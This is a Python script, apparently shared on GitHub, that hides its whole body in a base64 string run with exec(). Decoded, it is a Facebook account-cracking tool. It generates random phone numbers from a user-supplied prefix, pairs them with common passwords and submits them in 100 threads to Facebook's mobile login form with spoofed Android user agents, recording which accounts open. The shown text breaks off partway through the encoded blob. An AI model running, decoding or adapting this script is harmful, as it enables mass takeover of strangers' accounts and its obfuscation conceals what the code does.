#__________________| INFO |___________________#
#______SCRIPT ENCRYPTED BY PYTHON 3.0
#______CODING BY: ASHEKUR RAHAMAN
#______GITHUB : https://github.com/RX-ASHIK?tab=repositories
#________________| SCRIPT DATA |_____________#

import base64
exec(base64.b64decode(b'Iy0tLS0tLS0tLS0tLU1vZHVscy0tLS0tLS0tLS0tLSMNCmltcG9ydCBvcyxzeXMsdGltZSxqc29uLHJhbmRvbSxyZSxzdHJpbmcscGxhdGZvcm0sYmFzZTY0LHV1aWQscmljaA0KZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBhc3JhZg0KZnJvbSByaWNoLnByb2dyZXNzIGltcG9ydCB0cmFjaw0KZnJvbSByaWNoLnRyZWUgaW1wb3J0IFRyZWUNCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIHMNCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgd2FrdHUNCmZyb20gdGltZSBpbXBvcnQgbG9jYWx0aW1lIGFzIGx0DQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgY21kDQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQogICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZSByZXF1ZXN0cyBmdXR1cmVzIGJzND09MiA+IC9kZXYvbnVsbCcpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KICAgIF9fTm9kaV9fID0gb3Muc3lzdGVtDQpvPVBhbmVsKCcgICAgIFtib2xkIGN5YW4xXVtbYm9sZCBicmlnaHRfbWFnZW50YV1BW2JvbGQgY3lhbjFdXVtib2xkIHNlYV9ncmVlbjJdIG1iYXNpYyBbY3lhbjFdW1ticmlnaHRfbWFnZW50YV1CW2N5YW4xXV1bYm9sZCBzZWFfZ3JlZW4yXSBGcmVlIFtjeWFuMV1bW2JvbGQgYnJpZ2h0X21hZ2VudGFdQ1tjeWFuMV1dW2JvbGQgc2VhX2dyZWVuMl0gbSBbY3lhbjFdW1tib2xkIGJyaWdodF9tYWdlbnRhXURbY3lhbjFdXVtib2xkIHNlYV9ncmVlbjJdIHAgW2N5YW4xXVtbYm9sZCBicmlnaHRfbWFnZW50YV1FW2N5YW4xXV1bYm9sZCBzZWFfZ3JlZW4yXSB4IFtjeWFuMV1bW2JvbGQgYnJpZ2h0X21hZ2VudGFdRltjeWFuMV1dW2JvbGQgc2VhX2dyZWVuMl0gd2ViJyx0aXRsZT0nW2JvbGQgbWFnZW50YTFdW1tib2xkIHJlZDNdQ0hPSUNFIFtib2xkIGRlZXBfcGluazNdTUVUSE9EW21hZ2VudGExXV0nKTtrPVBhbmVsKCdcdFtib2xkIGdyZWVuXSAnKydDJysnSCcrJ08nKydJJysnQycrJ0UnKycgOiAnKycwJysnMScrJzMnKycgMCcrJzEnKyc5JysnIDAnKycxJysnNycrJyAwJysnMScrJzUnKycgMCcrJzEnKyc2JysnIDAnKycxJysnNCcrJyAwJysnMScrJzgnKTtpPVBhbmVsKCdcdCAgIFtib2xkIHNlYV9ncmVlbjJdVFtib2xkIHNlYV9ncmVlbjJdT1tib2xkIHNlYV9ncmVlbjJdT1tib2xkIHNlYV9ncmVlbjJdTFtib2xkIHNlYV9ncmVlbjJdU1tib2xkIHNlYV9ncmVlbjJdIENbYm9sZCBzZWFfZ3JlZW4yXVJbYm9sZCBzZWFfZ3JlZW4yXUVbYm9sZCBzZWFfZ3JlZW4yXUFbYm9sZCBzZWFfZ3JlZW4yXVRbYm9sZCBzZWFfZ3JlZW4yXUUgW2JvbGQgc2VhX2dyZWVuMl1CW2JvbGQgc2VhX2dyZWVuMl1ZIFtib2xkIHNlYV9ncmVlbjJdQVtib2xkIHNlYV9ncmVlbjJdU1tib2xkIHNlYV9ncmVlbjJdUltib2xkIHNlYV9ncmVlbjJdQVtib2xkIHNlYV9ncmVlbjJdRltib2xkIHNlYV9ncmVlbjJdVVtib2xkIHNlYV9ncmVlbjJdTFtib2xkIHNlYV9ncmVlbjJdIElbYm9sZCBzZWFfZ3JlZW4yXVNbYm9sZCBzZWFfZ3JlZW4yXUxbYm9sZCBzZWFfZ3JlZW4yXUFbYm9sZCBzZWFfZ3JlZW4yXU1bYm9sZCBzZWFfZ3JlZW4yXSBIW2JvbGQgc2VhX2dyZWVuMl1BW2JvbGQgc2VhX2dyZWVuMl1TW2JvbGQgc2VhX2dyZWVuMl1BW2JvbGQgc2VhX2dyZWVuMl1OW2JvbGQgc2VhX2dyZWVuMl0nKTtNPVBhbmVsKCcgW2N5YW4xXVtbYnJpZ2h0X21hZ2VudGFdQVtjeWFuMV1dW3NlYV9ncmVlbjJdICcrJ1tzZWFfZ3JlZW4yXVInKydbc2VhX2dyZWVuMl00JysnW3NlYV9ncmVlbjJdTicrJ1tzZWFfZ3JlZW4yXUQnKydbc2VhX2dyZWVuMl1PJysnW3NlYV9ncmVlbjJdTScrJyBbc2VhX2dyZWVuMl1DJysnW3NlYV9ncmVlbjJdTCcrJ1tzZWFfZ3JlZW4yXU8nKydbc2VhX2dyZWVuMl1OJysnW3NlYV9ncmVlbjJdRSBbY3lhbjFdW1ticmlnaHRfbWFnZW50YV1CW2N5YW4xXV1bc2VhX2dyZWVuMl0gJysnW3NlYV9ncmVlbjJdVCcrJ1tzZWFfZ3JlZW4yXUwnKycgW3NlYV9ncmVlbjJdUicrJ1tzZWFfZ3JlZW4yXUUnKydbc2VhX2dyZWVuMl1QJysnW3NlYV9ncmVlbjJdTycrJ1tzZWFfZ3JlZW4yXVInKydbc2VhX2dyZWVuMl1UIFtjeWFuMV1bW2JyaWdodF9tYWdlbnRhXUNbY3lhbjFdXVtzZWFfZ3JlZW4yXSAnKydbc2VhX2dyZWVuMl1DJysnW3NlYV9ncmVlbjJdTycrJ1tzZWFfZ3JlZW4yXU4nKydbc2VhX2dyZWVuMl1UJysnW3NlYV9ncmVlbjJdQScrJ1tzZWFfZ3JlZW4yXUMnKydbc2VhX2dyZWVuMl1UJysnIElbc2VhX2dyZWVuMl0nKydbc2VhX2dyZWVuMl1OJysnW3NlYV9ncmVlbjJdRicrJ1tzZWFfZ3JlZW4yXU8nKycgIFtjeWFuMV1bW2JyaWdodF9tYWdlbnRhXTBbY3lhbjFdXVtzZWFfZ3JlZW4yXSAnKydbc2VhX2dyZWVuMl1FJysnW3NlYV9ncmVlbjJdWCcrJ1tzZWFfZ3JlZW4yXUknKydbc2VhX2dyZWVuMl1UJyx0aXRsZT0nW21hZ2VudGExXVtbcmVkM10nKydbcmVkM11DJysnW3JlZDNdSCcrJ1tyZWQzXU8nKydbcmVkM11JJysnW3JlZDNdQycrJ1tyZWQzXUUnKycgW2RlZXBfcGluazNdJysnQicrJ1tkZWVwX3BpbmszXU8nKydbZGVlcF9waW5rM11YJysnW21hZ2VudGExXV0nKTtJPVBhbmVsKCcgW2N5YW4xXVtbYnJpZ2h0X21hZ2VudGFdQVtjeWFuMV1dW3NlYV9ncmVlbjJdICcrJ0YnKydBJysnQycrJ0UnKydCJysnTycrJ08nKydLJysnIEknKydEJysnIFtjeWFuMV1bW2JyaWdodF9tYWdlbnRhXUJbY3lhbjFdXVtzZWFfZ3JlZW4yXSAnKydGJysnQScrJ0MnKydFJysnQicrJ08nKydPJysnSycrJyBQJysnRycrJyBbY3lhbjFdW1ticmlnaHRfbWFnZW50YV1DW2N5YW4xXV1bc2VhX2dyZWVuMl0gJysnRicrJ0EnKydDJysnRScrJ0InKydPJysnTycrJ0snKycgRycrJ1AnKycgIFtjeWFuMV1bW2JyaWdodF9tYWdlbnRhXTBbY3lhbjFdXVtzZWFfZ3JlZW4yXScrJ0InKydBJysnQycrJ0snLHRpdGxlPSdbbWFnZW50YTFdW1tyZWQzXScrJ0knKydOJysnRicrJ08nKycgW2RlZXBfcGluazNdJysnQicrJ08nKydYJysnW21hZ2VudGExXV0nKTtDPVBhbmVsKCdcdFx0W2N5YW4xXVsgW3NlYV9ncmVlbjJdJysnQycrJ1InKydBJysnQycrJ0snKydJJysnTicrJ0cnKycgQycrJ08nKydNJysnUCcrJ0wnKydFJysnVCcrJ0UnKycgQicrJ1InKydPJysnW2N5YW4xXSBdJyk7aT1QYW5lbCgnXHQgICBbYm9sZCBzZWFfZ3JlZW4yXVRbYm9sZCBzZWFfZ3JlZW4yXU9bYm9sZCBzZWFfZ3JlZW4yXU9bYm9sZCBzZWFfZ3JlZW4yXUxbYm9sZCBzZWFfZ3JlZW4yXVNbYm9sZCBzZWFfZ3JlZW4yXSBDW2JvbGQgc2VhX2dyZWVuMl1SW2JvbGQgc2VhX2dyZWVuMl1FW2JvbGQgc2VhX2dyZWVuMl1BW2JvbGQgc2VhX2dyZWVuMl1UW2JvbGQgc2VhX2dyZWVuMl1FIFtib2xkIHNlYV9ncmVlbjJdQltib2xkIHNlYV9ncmVlbjJdWSBbYm9sZCBzZWFfZ3JlZW4yXUFbYm9sZCBzZWFfZ3JlZW4yXVNbYm9sZCBzZWFfZ3JlZW4yXVJbYm9sZCBzZWFfZ3JlZW4yXUFbYm9sZCBzZWFfZ3JlZW4yXUZbYm9sZCBzZWFfZ3JlZW4yXVVbYm9sZCBzZWFfZ3JlZW4yXUxbYm9sZCBzZWFfZ3JlZW4yXSBJW2JvbGQgc2VhX2dyZWVuMl1TW2JvbGQgc2VhX2dyZWVuMl1MW2JvbGQgc2VhX2dyZWVuMl1BW2JvbGQgc2VhX2dyZWVuMl1NW2JvbGQgc2VhX2dyZWVuMl0gSFtib2xkIHNlYV9ncmVlbjJdQVtib2xkIHNlYV9ncmVlbjJdU1tib2xkIHNlYV9ncmVlbjJdQVtib2xkIHNlYV9ncmVlbjJdTltib2xkIHNlYV9ncmVlbjJdJykNCiMtLS0tLS0tLS0tLS1Mb29wIEJveC0tLS0tLS0tLS0tLSMNCmlkID0gW107dXNlciA9IFtdO29rcyA9IFtdO2NwcyA9IFtdO2xvb3AgPSAwO3VnZW49W107aGFzYW4gPSBbXQ0KIy0tLS0tLS0tLS0tLS0tLS1Vc2VyIEFnZW50LS0tLS0tLS0tLSMNCmZvciB4ZCBpbiByYW5nZSg1MDAwKToNCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnXSkNCiAgICBjPSdSTVgzMTkxIEJ1aWxkL1JQMUEuMjAwNzIwLjAxMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZScNCiAgICBkPXJhbmRvbS5yYW5kcmFuZ2UoMTAsMjAwKQ0KICAgIGU9JzAuNDg0NC44OCAnDQogICAgZj1yYW5kb20ucmFuZHJhbmdlKDEwMDAsODAwMCkNCiAgICBnPXJhbmRvbS5yYW5kcmFuZ2UoMTAsMjAwKQ0KICAgIGg9J01vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM4My4xLjAuMjUuMTA2O10nDQogICAgdWFrdTI9KGYne2F9IHtifTt7Y317ZH0ue2V9LntmfS57Z30ge2h9JykNCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikNCmZvciB4ZCBpbiByYW5nZSg5MDAwKToNCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnXSkNCiAgICBjPSdDUEgyMjY5IEJ1aWxkL1JQMUEuMjAwNzIwLjAxMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8nDQogICAgZD1yYW5kb20ucmFuZHJhbmdlKDEwLDIwMCkNCiAgICBlPScwJw0KICAgIGY9cmFuZG9tLnJhbmRyYW5nZSgxMDAwLDgwMDApDQogICAgZz1yYW5kb20ucmFuZHJhbmdlKDEwLDIwMCkNCiAgICBoPSdNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2VuX1VTO0ZCQVYvMzQ4LjAuMC44LjEwMztdJw0KICAgIHVha3UyPShmJ3thfSB7Yn07e2N9e2R9LntlfS57Zn0ue2d9IHtofScpDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQpmb3IgeGQgaW4gcmFuZ2UoMTAwMDApOg0KICAgICAgYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJw0KICAgICAgYj1yYW5kb20uY2hvaWNlKFsnNS4xLjEnICwgJzYuMC4xJyAsICc3LjEuMScgLCAnMTInICwgJzEzJyAsICcxNCcgLCAnMTUnXSkNCiAgICAgIHk9cmFuZG9tLmNob2ljZShbJ1NNLUozMjBIJyAsICdTTS1KMzEwOScgLCAnSjMyMEZOJyAsICdTTS1KMzIwUCcgLCAnU00tSjMyMEYnICwgJ1NNLUozMjBHJyAsICdTTS1KMzIwWSddKQ0KICAgICAgYz0nQnVpbGQvTE1ZNDdYOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLycNCiAgICAgIGQ9cmFuZG9tLnJhbmRyYW5nZSg0MCwxMTUpDQogICAgICBlPScwJw0KICAgICAgZj1yYW5kb20ucmFuZHJhbmdlKDMwMDAsNjAwMCkNCiAgICAgIGc9cmFuZG9tLnJhbmRyYW5nZSgyMCwxMDApDQogICAgICBoPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICAgIHRhbWFubmE9KGYie2F9IHtifTsge3l9IHtjfXtkfS57ZX0ue2Z9LntnfSB7aH0iKQ0KICAgICAgdWdlbi5hcHBlbmQodGFtYW5uYSkNCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQoJYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJw0KCWI9cmFuZG9tLmNob2ljZShbJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1J10pDQoJYz0naXRlbCBTNjYxTFAgQnVpbGQvUlAxQS4yMDEwMDUuMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLycNCglkPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTE1KQ0KCWU9JzAnDQoJZj1yYW5kb20ucmFuZHJhbmdlKDMwMDAsNjAwMCkNCglnPXJhbmRvbS5yYW5kcmFuZ2UoMjAsMTAwKQ0KCWg9J01vYmlsZSBTYWZhcmkvNTM3LjM2Jw0KCWFzcmFmdWwxMT0oZiJ7YX0ge2J9OyB7Y317ZH0ue2V9LntmfS57Z30ge2h9IikNCgl1Z2VuLmFwcGVuZChhc3JhZnVsMTEpDQpsb2dvID0gKCIiIltncmVlbl0NCuKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKUgeKVkOKVkOKUgeKVkOKUgeKVkA0KSSBhbSBOb3QgU3BhbW1lciwgSSBhbSBKdXN0IGEgQ29veSBQZXN0ZXLwn5mCDQrilZTilZDilZfilIDilZTilabilZDilZDilZDilabilZfilIDilIDilZTilabilZDilZDilZDilabilZDilZfilIDilZTilZcgICDilZTilZDilZDilZDilZDilabilZDilZDilZDilabilZDilZfilIDilZTilabilZDilZfilIDilZTilabilZDilZDilZcNCuKVkeKVkeKVmuKVl+KVkeKVkeKVlOKVkOKVl+KVkeKVmuKVl+KVlOKVneKVkeKVlOKVkOKVl+KVkeKVkeKVmuKVl+KVkeKVkSAgIOKVkeKVlOKVl+KVlOKVl+KVkeKVlOKVkOKVl+KVkeKVkeKVmuKVl+KVkeKVkeKVkeKVmuKVl+KVkeKVoOKVo+KVoOKVnQ0K4pWR4pWU4pWX4pWa4pWd4pWR4pWR4pSA4pWR4pWg4pWX4pWa4pWd4pWU4pWj4pWR4pSA4pWR4pWR4pWU4pWX4pWa4pWd4pWRICAg4pWa4pWd4pWR4pWR4pWa4pWj4pWR4pSA4pWR4pWR4pWU4pWX4pWa4pWd4pWR4pWU4pWX4pWa4pWd4pWR4pWR4pWRDQrilZHilZHilZrilZfilZHilZHilZHilIDilZHilZHilZrilZfilZTilZ3ilZHilZHilIDilZHilZHilZHilZrilZfilZHilZHilIAgICDilIDilZHilZHilIDilZHilZHilIDilZHilZHilZHilZrilZfilZHilZHilZHilZrilZfilZHilZHilZHilZENCuKVkeKVkeKUgOKVkeKVkeKVkeKVmuKVkOKVneKVkeKUgOKVkeKVkeKUgOKVkeKVmuKVkOKVneKVkeKVkeKUgOKVkeKVkeKVkeKUgCAgIOKUgOKVkeKVkeKUgOKVkeKVmuKVkOKVneKVkeKVkeKUgOKVkeKVkeKVkeKVkeKUgOKVkeKVkeKVoOKVo+KVoOKVlw0K4pWa4pWd4pSA4pWa4pWQ4pWp4pWQ4pWQ4pWQ4pWd4pSA4pWa4pWd4pSA4pWa4pWQ4pWQ4pWQ4pWp4pWd4pSA4pWa4pWQ4pWd4pSAICAg4pSA4pWa4pWd4pSA4pWa4pWQ4pWQ4pWQ4pWp4pWd4pSA4pWa4pWQ4pWp4pWd4pSA4pWa4pWQ4pWp4pWQ4pWQ4pWdDQpUT09MIENSRUFURUQgQlkgQm0gTm95b24gSG9zc2VuIOKeoOKeoCBWRVJTSU9OPVYxLjAuMQ0K4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQ4pSB4pWQDQogIiIiKQ0KZGVmIGNsZWFyKCk6DQoJb3Muc3lzdGVtKCdjbGVhcicpDQpkZWYgbWFpbigpOg0KCWNsZWFyKCk7YXNyYWYobG9nbyk7YXNyYWYoTSkNCgloYXNhbjIzPWlucHV0KCcgIENob2ljZSA6ICcpDQoJaWYgaGFzYW4yMyBpbiBbJzEnLCcwMScsJ2EnLCdBJ106dHlyaW4oKQ0KCWlmIGhhc2FuMjMgaW4gWycyJywnMDInLCdiJywnQiddOm9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2FzbGFtLm1pYS4zNzg1MzczJykNCgllbHNlOg0KCQlleGl0KCkNCgkJDQpkZWYgaW5mbygpOg0KCWNsZWFyKCk7YXNyYWYobG9nbyk7YXNyYWYoSSkNCglpbmY9aW5wdXQoJyAgQ2hvaWNlIE9wdGlvbjogJykNCglpZiBpbmYgaW4gWycxJywnMDEnLCdhJywnQSddOm9zLnN5c3RlbSgneCcrJ2QnKydnJysnLScrJ28nKydwJysnZScrJ24gaCcrJ3QnKyd0JysncCcrJ3MnKyc6JysnLycrJy8nKyd3JysndycrJ3cnKycuJysnZicrJ2EnKydjJysnZScrJ2InKydvJysnbycrJ2snKycuJysnYycrJ28nKydtJysnLycrJ2MnKydvJysncCcrJ3knKycuJysnbCcrJ2knKyduJysnaycrJy4nKydlJysncicrJ28nKydyJysncicrJzQnKycwJysnNCcpO21haW4oKQ0KCWlmIGluZiBpbiBbJzInLCcwMicsJ0InLCdiJ106b3Muc3lzdGVtKCd4JysnZCcrJ2cnKyctJysnbycrJ3AnKydlJysnbiBoJysndCcrJ3QnKydwJysncycrJzonKycvJysnLycrJ3cnKyd3JysndycrJy4nKydmJysnYScrJ2MnKydlJysnYicrJ28nKydvJysnaycrJy4nKydjJysnbycrJ20nKycvJysncCcrJ3InKydvJysnZicrJ2knKydsJysnZScrJy4nKydwJysnaCcrJ3AnKyc/JysnaScrJ2QnKyc9JysnMScrJzAnKycwJysnMCcrJzknKycwJysnNycrJzQnKycwJysnNycrJzcnKyc5JysnOCcrJzEnKycyJyk7bWFpbigpDQoJaWYgaW5mIGluIFsnMycsJzAzJywnYycsJ0MnXTpvcy5zeXN0ZW0oJ3gnKydkJysnZycrJy0nKydvJysncCcrJ2UnKyduIGgnKyd0JysndCcrJ3AnKydzJysnOicrJy8nKycvJysnZicrJ2EnKydjJysnZScrJ2InKydvJysnbycrJ2snKycuJysnYycrJ28nKydtJysnLycrJ2cnKydyJysnbycrJ3UnKydwJysncycrJy8nKyc1JysnNScrJzEnKyczJysnNicrJzUnKyc3JysnNScrJzYnKyc3JysnNScrJzgnKyc0JysnOCcrJzcnKycvJyk7bWFpbigpDQoJaWYgaW5mIGluIFsnMCcsJzAwJywnZScsJ0UnXTptYWluKCkNCiMtLS0tLS0tLS0tLS1NYWluIERlZi0tLS0tLS0tLS0tLSMNCmRlZiB0eXJpbigpOg0KICAgIHVzZXI9W10NCiAgICBnbG9iYWwgaGFzYW4NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgY2xlYXIoKTthc3JhZihsb2dvKTthc3JhZihrKQ0KICAgIGNvZGUgPSBpbnB1dCgnICBTSU0gQ09ERSA6ICcpDQogICAgY2xlYXIoKTthc3JhZihsb2dvKTthc3JhZihpKTthc3JhZihoKQ0KICAgIGxpbWl0PWludChpbnB1dCgiICBDUkFDS0lORyBMSU1JVCA6ICIpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDgpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTEwMCkgYXMgSGFzYW5fVmFpOg0KICAgICAgICB0bCA9IHN0cihsZW4odXNlcikpDQogICAgICAgIGNsZWFyKCk7YXNyYWYobG9nbykNCiAgICAgICAgYXNyYWYoUGFuZWwoZidcdFx0W2JvbGQgZ3JlZW5dWU9VUiBTSU0gQ09ERSA6ICcrY29kZSkpDQogICAgICAgIGFzcmFmKFBhbmVsKGYnXHRcdFtib2xkIGdyZWVuXUNSQUNLSU5HIExJTUlUOiAnK3RsKSkNCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoNCiAgICAgICAgICAgIHB3eCA9IFtsb3ZlLGxvdmVbMjpdLGNvZGUrbG92ZVs6M10sJ0ZyZWVGaXJlJywnUHViZzEyMycsJ1Rpa1RvaycsJ0FsaDRhaiddDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIEhhc2FuX1ZhaS5zdWJtaXQobm9kaSx1aWQscHd4LHRsKQ0KDQogICAgYXNyYWYoQykNCmg9UGFuZWwoJ1x0XHRbYm9sZCBncmVlbl0gJysnQycrJ0gnKydPJysnSScrJ0MnKydFJysnIDogJysnMicrJzAnKycwJysnMCcrJyAvJysnIDUnKycwJysnMCcrJzAnKycgLycrJyAxJysnMCcrJzAnKycwJysnMCcpDQoNCmRlZiBub2RpKHVpZCxwd3gsdGwpOg0KICAgIGdsb2JhbCBsb29wDQogICAgZ2xvYmFsIGNwcw0KICAgIGdsb2JhbCBva3MNCiAgICBnbG9iYWwgYWdlbnRzDQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShmJ1xyICBcMDMzWzE7OTFtW1wwMzNbMTs5Mm1DUkFDS0lOR1wwMzNbMTs5MW1dW1wwMzNbMTs5Mm0lc1wwMzNbMTs5MW1dIFwwMzNbMTs5MW1bXDAzM1sxOzkybU9LLSVzXDAzM1sxOzkxbV1cciclKGxvb3AsbGVuKG9rcykpKSwNCiAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tJykudGV4dA0KICAgICAgICAgICAgbG9nX2RhdGEgPSB7DQogICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJsaSI6cmUuc2VhcmNoKCduYW1lPSJsaSIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAidHJ5X251bWJlciI6IjAiLA0KICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLA0KICAgICAgICAgICAgImVtYWlsIjp1aWQsDQogICAgICAgICAgICAicGFzcyI6cHMsDQogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQ0KICAgICAgICAgICAgaGVhZGVyX2ZyZWVmYiA9IHsnYXV0aG9yaXR5JzogJ20uZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICJtZXRob2QiOiAnR0VUJywNCiAgICAgICAgICAgICJzY2hlbWUiOiAnaHR0cHMnLA0KICAgICAgICAgICAgImFjY2VwdCI6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjgnLA0KICAgICAgICAgICAgImFjY2VwdC1lbmNvZGluZyI6ICdnemlwLCBkZWZsYXRlLCBicicsDQogICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjogJ2VuLVVTLGVuO3E9MScsDQogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICduby1jYWNoZSwgbm8tc3RvcmUsIG11c3QtcmV2YWxpZGF0ZScsDQogICAgICAgICAgICAicmVmZXJlciI6ICdodHRwczovL20uZmFjZWJvb2suY29tLycsDQogICAgICAgICAgICAic2VjLWNoLXVhIjogJyJHb29nbGUgQ2hyb21lIjt2PSI5MCIsICJOb3QpQTtCcmFuZCI7dj0iOCIsICJDaHJvbWl1bSI7dj0iNzUiJywNCiAgICAgICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogJz8xJywNCiAgICAgICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAiV2luZG93cyIsDQogICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiAnZG9jdW1lbnQnLA0KICAgICAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogJ25hdmlnYXRlJywNCiAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICdzYW1lLW9yaWdpbicsDQogICAgICAgICAgICAic2VjLWZldGNoLXVzZXIiOiAnPzAnLA0KICAgICAgICAgICAgInByYWdtYSI6ICduby1jYWNoZScsDQogICAgICAgICAgICAicHJpb3JpdHkiOiAndT0wJywNCiAgICAgICAgICAgICdjcm9zcy1vcmlnaW4tcmVzb3VyY2UtcG9saWN5JzogJ2Nyb3NzLW9yaWdpbicsDQogICAgICAgICAgICAidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6ICcxJywNCiAgICAgICAgICAgICJ1c2VyLWFnZW50IjogcHJvLH0NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmbG9naW5fZnJvbV9heW1oPTEmcmVmaWQ9OCcsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQNCiA